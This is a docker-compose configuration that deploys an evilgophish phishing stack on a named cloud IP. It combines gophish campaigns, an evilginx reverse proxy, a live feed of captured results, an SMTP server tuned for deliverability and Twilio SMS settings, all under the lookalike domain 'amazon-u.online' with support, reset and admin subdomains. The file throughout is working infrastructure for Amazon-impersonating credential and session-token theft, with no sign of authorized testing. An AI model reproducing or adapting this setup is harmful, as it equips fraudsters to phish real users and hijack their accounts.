# docker-compose.yml
# Setup for evilgophish with SMTP on Lightsail (3.147.37.21).
# Changes: Domain amazon-u.online; Turnstile optional; uses src/evilginx3; validates src; ensures mailconfig; makes evilfeed optional.
# Services: nginx (proxy), gophish (campaigns), evilginx (phishing), evilfeed (real-time, optional), mailserver (SMTP).
# Volumes: Persistent for data/logs/uploads; mailconfig for DKIM/postfix.
# Ports: 80/443 (web), 25/465/587 (SMTP), 3333/1337 (local admin/feed).
# Best Practices:
# - DNS: Lightsail zone for amazon-u.online; SPF/DKIM/DMARC for deliverability.
# - Security: Restrict ports; use secrets for credentials.
# - Deliverability: Warm IP; monitor maillogs.
# - Troubleshooting: Check src/evilginx3, src/gophish; verify mailconfig/opendkim.

services:
  nginx:
    image: nginx:alpine
    ports:
      - "80:80"
      - "443:443"
    volumes:
      - ./nginx.conf:/etc/nginx/nginx.conf:ro
      - ssl:/etc/nginx/ssl:ro
      - logs:/var/log/nginx
    depends_on:
      - evilginx
      - gophish
    restart: unless-stopped
    networks:
      - evilnet
    logging:
      driver: "json-file"
      options:
        max-size: "10m"
        max-file: "3"

  gophish:
    build:
      context: .
      dockerfile: Dockerfile.gophish
    ports:
      - "127.0.0.1:3333:3333"
    volumes:
      - gophish_data:/app/data
      - ./gophish/config.json:/app/config.json:ro
      - uploads:/app/uploads
      - logs:/app/logs
    environment:
      - GOPHISH_DB_PATH=/app/data/gophish.db
      - SMTP_HOST=${SMTP_HOST:-mailserver}
      - SMTP_PORT=${SMTP_PORT:-587}
      - SMTP_USER=${SMTP_USER:-support@amazon-u.online}
      - SMTP_PASS=${SMTP_PASS}
      - TWILIO_ACCOUNT_SID=${TWILIO_ACCOUNT_SID}
      - TWILIO_AUTH_TOKEN=${TWILIO_AUTH_TOKEN}
      - TWILIO_PHONE=${TWILIO_PHONE}
    command: ./gophish
    depends_on:
      - mailserver
    restart: unless-stopped
    networks:
      - evilnet
    healthcheck:
      test: ["CMD", "wget", "--spider", "http://localhost:3333"]
      interval: 30s
      timeout: 10s
      retries: 3

  evilginx:
    build:
      context: .
      dockerfile: Dockerfile.evilginx
    volumes:
      - evilginx_data:/app
      - /etc/resolv.conf:/etc/resolv.conf:ro
      - uploads:/app/uploads:ro
      - logs:/app/logs
    environment:
      - DOMAIN=${DOMAIN:-amazon-u.online}
      - SUBDOMAINS=${SUBDOMAINS:-support,email,reset,admin}
      - PROXY_ROOT=${PROXY_ROOT:-true}
      - RID_REPLACEMENT=${RID_REPLACEMENT:-user_id}
      - TURNSTILE_PUBLIC=${TURNSTILE_PUBLIC:-}
      - TURNSTILE_PRIVATE=${TURNSTILE_PRIVATE:-}
      - GOPHISH_DB=/app/data/gophish.db
      - FEED_ENABLED=${FEED_ENABLED:-true}
    command: >
      sh -c "
        evilginx -g /app/data/gophish.db
        ${TURNSTILE_PUBLIC:+-turnstile $TURNSTILE_PUBLIC:$TURNSTILE_PRIVATE}
        ${FEED_ENABLED:+ -feed}
      "
    depends_on:
      - gophish
    restart: unless-stopped
    cap_add:
      - NET_ADMIN
    networks:
      - evilnet
    healthcheck:
      test: ["CMD", "pgrep", "evilginx"]
      interval: 30s
      timeout: 10s
      retries: 3

  evilfeed:
    build:
      context: .
      dockerfile: Dockerfile.evilfeed
    depends_on:
      - gophish  # Ensure gophish starts first
    entrypoint: >
      sh -c "
        [ -f src/evilfeed/main.go ] && ./evilfeed || echo 'src/evilfeed/main.go not found, skipping evilfeed'
      "
    ports:
      - "127.0.0.1:1337:1337"
    volumes:
      - evilfeed_data:/app/data
      - gophish_data:/app/gophish_data:ro
      - logs:/app/logs
    environment:
      - GOPHISH_DB=/app/gophish_data/gophish.db
      - WEBSOCKET_PORT=1337
    command: ./evilfeed
    restart: unless-stopped
    networks:
      - evilnet
    healthcheck:
      test: ["CMD", "wget", "--spider", "http://localhost:1337"]
      interval: 30s
      timeout: 10s
      retries: 3

  mailserver:
    image: ghcr.io/docker-mailserver/docker-mailserver:latest
    hostname: mail.${DOMAIN:-amazon-u.online}
    ports:
      - "25:25"
      - "465:465"
      - "587:587"
    volumes:
      - maildata:/var/mail
      - mailstate:/var/mail-state
      - maillogs:/var/log/mail
      - ./mailconfig:/tmp/docker-mailserver/
      - logs:/var/log/supervisor
    environment:
      - OVERRIDE_HOSTNAME=mail.${DOMAIN:-amazon-u.online}
      - DMS_DMARC_POLICY=quarantine
      - DMS_SPF_POLICY=reject
      - PERMIT_DOCKER=network
      - ENABLE_CLAMAV=1
      - ENABLE_FAIL2BAN=1
      - ENABLE_POSTGREY=0
      - SSL_TYPE=snakeoil
    cap_add:
      - NET_ADMIN
      - SYS_PTRACE
    restart: unless-stopped
    networks:
      - evilnet
    healthcheck:
      test: ["CMD", "nc", "-z", "localhost", "25"]
      interval: 30s
      timeout: 10s
      retries: 3

volumes:
  gophish_data:
  evilginx_data:
  evilfeed_data:
  uploads:
  ssl:
  logs:
  maildata:
  mailstate:
  maillogs:
  mailconfig:

networks:
  evilnet:
    driver: bridge